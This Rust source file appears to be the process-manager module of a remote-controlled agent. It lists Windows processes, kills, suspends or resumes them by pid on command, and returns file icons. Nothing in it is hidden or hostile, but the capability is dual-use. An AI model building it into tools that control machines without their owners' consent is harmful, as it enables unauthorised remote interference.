use crate::{
    commands::Ctx,
    protocol::{self, Obj, Value},
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "process_list" => {
            let processes = collect();
            ctx.out
                .send(
                    Obj::new()
                        .put(protocol::key_type(), protocol::s("process_list_result"))
                        .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                        .put(protocol::key_processes(), protocol::arr(processes))
                        .value(),
                )
                .await;
        }
        "process_icon" => process_icon(&ctx).await,
        "process_kill" | "process_suspend" | "process_resume" => {
            let pid = ctx
                .integer("pid")
                .or_else(|| ctx.string("pid").and_then(|value| value.trim().parse().ok()))
                .unwrap_or(0);
            if pid <= 0 {
                ctx.out
                    .result(&ctx.command, false, Some("invalid pid"))
                    .await;
                return;
            }
            let pid = pid as u32;
            let result = match ctx.command.name.as_str() {
                "process_kill" => kill(pid),
                "process_suspend" => suspend(pid),
                _ => resume(pid),
            };
            match result {
                Ok(()) => ctx.out.result(&ctx.command, true, None).await,
                Err(error) => ctx.out.result(&ctx.command, false, Some(&error)).await,
            }
        }
        _ => {
            ctx.out
                .result(&ctx.command, false, Some("unknown process command"))
                .await
        }
    }
}

#[cfg(windows)]
fn collect() -> Vec<Value> {
    let self_pid = crate::win::process::self_pid();
    crate::win::process::list()
        .into_iter()
        .map(|entry| {
            Obj::new()
                .put(protocol::key_pid(), protocol::n(entry.pid as i64))
                .put(protocol::key_ppid(), protocol::n(entry.ppid as i64))
                .put(protocol::key_name(), protocol::s(&entry.name))
                .put(protocol::key_exe_path(), protocol::s(&entry.exe_path))
                .put(protocol::key_memory(), protocol::n(entry.memory as i64))
                .put(
                    protocol::key_self_process(),
                    protocol::b(entry.pid == self_pid),
                )
                .value()
        })
        .collect()
}

#[cfg(not(windows))]
fn collect() -> Vec<Value> {
    Vec::new()
}

#[cfg(windows)]
fn kill(pid: u32) -> Result<(), String> {
    crate::win::process::kill(pid)
}

#[cfg(not(windows))]
fn kill(_pid: u32) -> Result<(), String> {
    Err("not supported".to_owned())
}

#[cfg(windows)]
fn suspend(pid: u32) -> Result<(), String> {
    crate::win::process::suspend(pid)
}

#[cfg(not(windows))]
fn suspend(_pid: u32) -> Result<(), String> {
    Err("not supported".to_owned())
}

#[cfg(windows)]
fn resume(pid: u32) -> Result<(), String> {
    crate::win::process::resume(pid)
}

#[cfg(not(windows))]
fn resume(_pid: u32) -> Result<(), String> {
    Err("not supported".to_owned())
}

async fn process_icon(ctx: &Ctx) {
    let items = protocol::array_field(ctx.payload(), "items");
    let mut icons = Vec::new();
    for item in items {
        let key = protocol::string_field(item, "key").unwrap_or("").to_owned();
        let path = protocol::string_field(item, "path").unwrap_or("").to_owned();
        let extension = protocol::string_field(item, "ext").unwrap_or("").to_owned();
        let entry = tokio::task::spawn_blocking(move || {
            #[cfg(windows)]
            let icon = if !path.is_empty() {
                crate::win::shell::file_icon_png(&path)
            } else {
                crate::win::shell::file_icon_png_for_extension(&extension)
            };
            #[cfg(not(windows))]
            let icon: Result<Vec<u8>, String> = Err("not supported".to_owned());
            match icon {
                Ok(png) => Obj::new()
                    .put(protocol::key_key(), protocol::s(&key))
                    .put(protocol::key_png(), protocol::bin(png))
                    .value(),
                Err(error) => Obj::new()
                    .put(protocol::key_key(), protocol::s(&key))
                    .put(protocol::key_error(), protocol::s(&error))
                    .value(),
            }
        })
        .await
        .unwrap_or_else(|_| Obj::new().put(protocol::key_key(), protocol::s("")).value());
        icons.push(entry);
    }
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("process_icon_result"))
                .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                .put(protocol::key_icons(), protocol::arr(icons))
                .value(),
        )
        .await;
}
